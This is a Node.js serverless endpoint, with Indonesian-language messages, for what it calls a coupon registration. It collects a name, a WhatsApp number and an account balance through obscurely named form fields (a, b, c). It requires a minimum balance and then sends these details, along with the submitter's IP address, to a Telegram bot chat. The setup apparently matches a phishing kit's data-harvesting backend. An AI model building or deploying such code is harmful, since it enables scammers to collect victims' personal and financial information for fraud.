const axios = require('axios');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      message: 'Method not allowed' 
    });
  }

  try {
    // PERBAIKAN: Menggunakan nama field yang sesuai dengan form (a, b, c)
    const { a: name, b: phone, c: balance } = req.body;

    // Validate input
    if (!name || !phone || !balance) {
      return res.status(400).json({
        success: false,
        message: 'Semua field harus diisi'
      });
    }

    // Validate phone number format
    if (!/^08[0-9]{8,13}$/.test(phone)) {
      return res.status(400).json({
        success: false,
        message: 'Nomor WhatsApp tidak valid'
      });
    }

    // Parse balance - hapus format Rupiah jika ada
    const cleanBalance = balance.toString().replace(/[^\d]/g, '');
    
    // Validate balance
    if (cleanBalance.length < 3 || parseInt(cleanBalance) < 100) {
      return res.status(400).json({
        success: false,
        message: 'Saldo terlalu kecil'
      });
    }

    // Get credentials from environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Environment variables not set');
      return res.status(500).json({
        success: false,
        message: 'Server configuration error'
      });
    }

    // Format message for Telegram
    const telegramMessage = `
🆕 Pendaftaran Kupon Baru:
────────────────────
📛 Nama: ${name}
📞 WhatsApp: https://wa.me/${phone}
💳 Saldo: Rp ${parseInt(cleanBalance).toLocaleString('id-ID')}
────────────────────
📅 Tanggal: ${new Date().toLocaleString('id-ID')}
🖥️ IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}
    `;

    // Send to Telegram
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: telegramMessage,
        parse_mode: 'HTML'
      }
    );

    // Log success
    console.log('Data sent to Telegram:', { name, phone, balance: cleanBalance });

    // Return success response
    res.status(200).json({
      success: true,
      message: 'Data berhasil dikirim'
    });

  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    
    // Check if it's a Telegram API error
    if (error.response?.data?.description) {
      return res.status(500).json({
        success: false,
        message: 'Gagal mengirim data ke Telegram: ' + error.response.data.description
      });
    }
    
    res.status(500).json({
      success: false,
      message: 'Terjadi kesalahan server: ' + error.message
    });
  }
};
